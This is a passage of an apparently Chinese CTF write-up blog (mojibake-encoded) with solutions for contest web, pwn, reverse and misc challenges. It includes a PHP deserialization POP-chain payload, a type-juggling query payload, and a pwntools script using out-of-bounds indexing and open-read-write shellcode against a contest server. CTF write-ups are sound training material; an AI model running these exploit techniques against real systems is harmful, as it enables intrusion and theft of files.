class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r1</span>=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$r1</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$r</span>=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$r</span>-&gt;a=<span class="variable">$r1</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$i</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]=<span class="variable">$r</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> Start();</span><br><span class="line"><span class="variable">$s</span>-&gt;name=<span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$s</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:&#123;s:17:&quot;Infophonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I will not !!!!&quot;;s:4:&quot;file&quot;;a:1:&#123;s:8:&quot;filename&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;&#x2F;flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;&#x2F;flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;s:0:&quot;&quot;;&#125;&#125;&#125;&#125;s:4:&quot;flag&quot;;s:33:&quot;syst3m(&quot;cat 127.0.0.1&#x2F;etc&#x2F;hint&quot;);&quot;;&#125;</span><br></pre></td></tr></table></figure><p>æœ€åbase64è§£å¯†å¾—åˆ°flagï¼šflag{45c379e6-bc15-4df0-967e-763faac4e7bb}</p><h2 id="å¼ºç½‘å…ˆé”‹-å¯»å®"><a href="#å¼ºç½‘å…ˆé”‹-å¯»å®" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]å¯»å®"></a>[å¼ºç½‘å…ˆé”‹]å¯»å®</h2><p>key1ï¼šKEY1{e1e1d3d40573127e9ee0480caf1283d6}</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ppp[number1]&#x3D;9999%00&amp;ppp[number2]&#x3D;2e9&amp;ppp[number3]&#x3D;61823470&amp;ppp[number4]&#x3D;0000key000&amp;ppp[number5]&#x3D;%00&amp;y&#x3D;1</span><br></pre></td></tr></table></figure><p>key2ï¼šKEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}</p><p>ç›´æ¥ä¸‹å¥½é™„ä»¶åœ¨æ–‡ä»¶å¤¹æœç´¢æ¡†æŸ¥æ‰¾key2å°±èƒ½å¾—åˆ°</p><p>æœ€åæäº¤ä¸¤ä¸ªkeyå³å¯å¾—åˆ°flag</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezmath"><a href="#ezmath" class="headerlink" title="ezmath"></a>ezmath</h2><blockquote><p><a href="https://pan.baidu.com/s/1fU--SjhDX0QrB3b9nPsDEQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šsuboï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> e=<span class="number">2.718281828459045</span>;</span><br><span class="line"><span class="keyword">double</span> flag[<span class="number">19</span>]=</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">0.00009794904266317233</span>,</span><br><span class="line">   <span class="number">0.00010270456917442</span>,</span><br><span class="line">   <span class="number">0.00009194256152777895</span>,</span><br><span class="line">   <span class="number">0.0001090322021913372</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001007442677411854</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001047063607908828</span>,</span><br><span class="line">   <span class="number">0.0001112818534005219</span>,</span><br><span class="line">   <span class="number">0.0001046861985862495</span>,</span><br><span class="line">   <span class="number">0.0001112818534005219</span>,</span><br><span class="line">   <span class="number">0.000108992856167966</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001090234561758122</span>,</span><br><span class="line">   <span class="number">0.0001113183108652088</span>,</span><br><span class="line">   <span class="number">0.0001006882924839248</span>,</span><br><span class="line">   <span class="number">0.0001112590796092291</span>,</span><br><span class="line">   <span class="number">0.0001089841164633298</span>,</span><br><span class="line">   <span class="number">0.00008468431512187874</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">19</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">double</span> k=flag[i];</span><br><span class="line">        <span class="keyword">int</span> num=e/k;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,num<span class="number">-1</span>,num&gt;&gt;<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="å¼ºç½‘å…ˆé”‹-orw"><a href="#å¼ºç½‘å…ˆé”‹-orw" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]orw"></a>[å¼ºç½‘å…ˆé”‹]orw</h2><blockquote><p>nc 39.105.131.68 12354</p><p><a href="https://pan.baidu.com/s/1qXjidBqXzcH_z_kjI-gSCQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šs97yï¼‰</p></blockquote><p>æ•°ç»„ä¸‹æ ‡å¯æ§ä¸”å¯ä»¥ä¸ºä»»æ„å€¼,æ•°ç»„è¶Šç•Œæ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;39.105.131.68&#x27;</span>,<span class="number">12354</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">&#x27;-13&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:\n&quot;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">push 8</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx </span></span><br><span class="line"><span class="string">xor esi, esi </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 2 </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor eax, eax </span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1 </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#read flag path</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼ºç½‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021DozerCTF</title>
      <link href="2021/05/30/2021DozerCTF/"/>
      <url>2021/05/30/2021DozerCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"><a href="#ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§" class="headerlink" title="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"></a>ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§</h2><p>Bç«™è§†é¢‘è—æœ‰flagï¼šDozerCTF{w3lc0me_to_Do2erCTF}</p><p><img src="https://i.loli.net/2021/05/29/U3MWaLvtJuChzkr.png"></p><h2 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h2><p>binwalk + foremost åˆ†ç¦»å‡ºä¸ª gif å’Œ png </p><p>â‘ .gif</p><p>åˆ†ç¦»å‘ç°äºŒç»´ç ä¸å¯¹åŠ²ï¼Œäºæ˜¯ä¹å›åˆ°å›¾ç‰‡æ ¹æ®gifçš„å¤´å’Œå°¾æ‰‹å·¥åˆ†ç¦»å‡ºgifï¼Œå¾—åˆ°æœ‰ç”¨ä¿¡æ¯ï¼šDozerCTF{is_it_simple</p><p><img src="https://i.loli.net/2021/05/29/RDW1AuUnxebQXEP.png"></p><p>â‘¡.png</p><p>é›¶å®½ï¼Œé€šè¿‡<a href="https://www.mzy0.com/ctftools/zerowidth2/"><strong>åœ¨çº¿ç½‘ç«™</strong></a>è§£ç å¾—åˆ°æœ‰ç”¨ä¿¡æ¯ï¼š_for_you!congratulate}</p><p><img src="https://i.loli.net/2021/05/29/m1tjLrfElTbNIH7.png"></p><p>æœ€ç»ˆæ•´ç†å¾—åˆ°flagï¼šDozerCTF{is_it_simple_for_you!congratulate}</p><h2 id="detective-novel"><a href="#detective-novel" class="headerlink" title="detective_novel"></a>detective_novel</h2><p>è€å¥—å¨ƒäº†ï¼ä¸Šæ‰‹ binwalk + foremoståˆ†ç¦»å‡ºä¸¤å¼ å›¾ç‰‡ï¼Œæ¥ç€å†åˆ†ç¦»ä¸€æ³¢<code>hint.png</code>å¾—åˆ°ä¸€åŠ å¯†åŒ…ï¼Œbut æˆ‘ä»¬ç”¨bandzipå°±æ˜¯æœªåŠ å¯†ï¼Œè·³èˆå°äººè§£å¾—keyä¸º<code>DOZER</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5293066.png"></p><p>æœ€åæ ¹æ®hintçš„å›¾ç‰‡æç¤ºå¾—çŸ¥æ˜¯outguessï¼Œè§£å¯†å¾—åˆ°flagï¼šDozerCTF{Y0u_arE_h0lME4}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;DOZER&quot; -r flag.jpg flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/29/Mqy7P4C3AwnTDzX.png"></p><h2 id="ä¸€ç‚¹ä¹Ÿä¸æ‚"><a href="#ä¸€ç‚¹ä¹Ÿä¸æ‚" class="headerlink" title="ä¸€ç‚¹ä¹Ÿä¸æ‚"></a>ä¸€ç‚¹ä¹Ÿä¸æ‚</h2><p>â‘ .æ—¥å†ç”»å›¾</p><p>å°†å›¾ç‰‡ç”¨è®°äº‹æœ¬æ‰“å¼€æ»‘åˆ°æœ€åº•ä¸‹å‘ç°ä¸€ä¸²æ•°å­—ï¼Œé€šè¿‡æ—¥å†å°†å…¶é€ä¸ªè¿æ¥å¾—åˆ°ï¼šDOYOUKNOW_CRT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">040513202625181104</span><br><span class="line">0506071522282726181105</span><br><span class="line">051307132027</span><br><span class="line">0506071522282726181105</span><br><span class="line">051219262728211407</span><br><span class="line">0512192606122028</span><br><span class="line">26191205132129221508</span><br><span class="line">0506071522282726181105</span><br><span class="line">0325052707</span><br><span class="line">252627</span><br><span class="line">07060504111825262728</span><br><span class="line">25181104050612111927</span><br><span class="line">05060706132027</span><br></pre></td></tr></table></figure><p>â‘¡.ä¸­å›½å‰©ä½™å®šç†</p><p>ç™¾åº¦æ‰¾ä¸ªè„šæœ¬è·‘ä¸‹å¾—åˆ°keyä¸º5007</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ±‚ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬çº¦æ•°gcdå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ¤æ–­ä¸€ä¸ªåˆ—è¡¨ä»»æ„ä¸¤ä¸ªæ•°æ˜¯å¦ä¸¤ä¸¤äº’è´¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span>(<span class="params"><span class="built_in">list</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">            <span class="keyword">if</span> gcd(<span class="built_in">list</span>[i],<span class="built_in">list</span>[j]) != <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">&#x27;ä¸èƒ½ç›´æ¥ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼&#x27;</span>)</span><br><span class="line">                exit()</span><br><span class="line"><span class="comment">#å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œå°±ä¼šç»§ç»­æ‰§è¡Œï¼Œå¦åˆ™é€€å‡ºç¨‹åº</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚å‡ºè¾“å…¥çš„m1,m2,..,mk çš„ä¹˜ç§¯m</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product_m</span>(<span class="params"><span class="built_in">list</span></span>):</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        m *= i</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚M1,M2,..,MK çš„å€¼ Mj = m / mj å¹¶è¿”å›ä¸€ä¸ªåä¸ºshangçš„åˆ—è¡¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_divsion</span>(<span class="params"><span class="built_in">list</span>,m</span>):</span></span><br><span class="line">    div = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        div.append(m // i)</span><br><span class="line">    <span class="keyword">return</span> div</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_inverse</span>(<span class="params">a, m</span>):</span>  <span class="comment"># æ±‚ä¸€ä¸ªæ•°a çš„é€†  å†æ¨¡m çš„å€¼  è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªå€¼ä¸æ˜¯åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">if</span> gcd(a, m) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    u1, u2, u3 = <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    v1, v2, v3 = <span class="number">0</span>, <span class="number">1</span>, m</span><br><span class="line">    <span class="keyword">while</span> v3 != <span class="number">0</span>:</span><br><span class="line">        q = u3 // v3</span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    <span class="keyword">return</span> u1 % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚Xj   ç®—æ³•ä¸ºï¼šXj = (M * M_INVERSE * a) % mj</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_x</span>(<span class="params">M:<span class="built_in">int</span> ,M_inverse:<span class="built_in">int</span> ,a :<span class="built_in">int</span>,m:<span class="built_in">int</span></span>):</span></span><br><span class="line">    product_x = (M * M_inverse * a) % m</span><br><span class="line">    <span class="keyword">return</span> product_x</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç®—å‡ºæœ€ç»ˆç­”æ¡ˆX = X1+X2+...Xk</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_solution</span>(<span class="params">list_m, list_a</span>):</span></span><br><span class="line">                                                        <span class="comment"># compare(list_m)</span></span><br><span class="line">    m = product_m(list_m)</span><br><span class="line"></span><br><span class="line">    list_M = get_divsion(list_m, m)</span><br><span class="line"></span><br><span class="line">    list_M_inverse = []</span><br><span class="line">    list_X = []</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(list_M)):</span><br><span class="line">        list_M_inverse.append(get_inverse(list_M[i], list_m[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_M)):</span><br><span class="line">        list_X.append(get_x(list_M[i],list_M_inverse[i],list_a[i],m))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> list_X:</span><br><span class="line">        total += x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># #æµ‹è¯•æ•°æ®</span></span><br><span class="line"><span class="comment"># list_a = [2,3,2]</span></span><br><span class="line"><span class="comment"># list_m = [3,5,7]</span></span><br><span class="line">list_a = [<span class="number">2</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">16</span>]</span><br><span class="line">list_m = [<span class="number">5</span>,<span class="number">7</span>,<span class="number">17</span>,<span class="number">23</span>]</span><br><span class="line">print(get_solution(list_m, list_a))</span><br></pre></td></tr></table></figure><p>â‘¢.base85è§£ç </p><p><img src="https://i.loli.net/2021/05/29/mWAV1wG5Crbcfnj.png"></p><p>æœ€ç»ˆæ•´ç†å¾—åˆ°flagï¼šDozerCTF{DOYOUKNOW_CRT5007_good_over}</p><h2 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h2><p>å¯¹æ¯”ä¸¤å¼ ä¸€æ ·çš„å›¾ç‰‡æ‰¾åˆ°ä¸åŒçš„åƒç´ ç‚¹ï¼Œç„¶åå°†æ¯å¼ å›¾ç‰‡çš„0å’Œ1æå–å‡ºæ¥8ä½ä¸€ç»„è½¬å­—ç¬¦ï¼Œå¾—åˆ°flagï¼šDozerCTF{D0_yOU_LIke_PixEl}</p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">219</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./funny_pixel/&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    x, y = img.size</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            p = img.getpixel((i,j))</span><br><span class="line">            <span class="keyword">if</span> p ==(<span class="number">239</span>, <span class="number">239</span>, <span class="number">39</span>):</span><br><span class="line">                t+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t==<span class="number">10</span>:</span><br><span class="line">        res+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res+=<span class="string">&#x27;1&#x27;</span></span><br><span 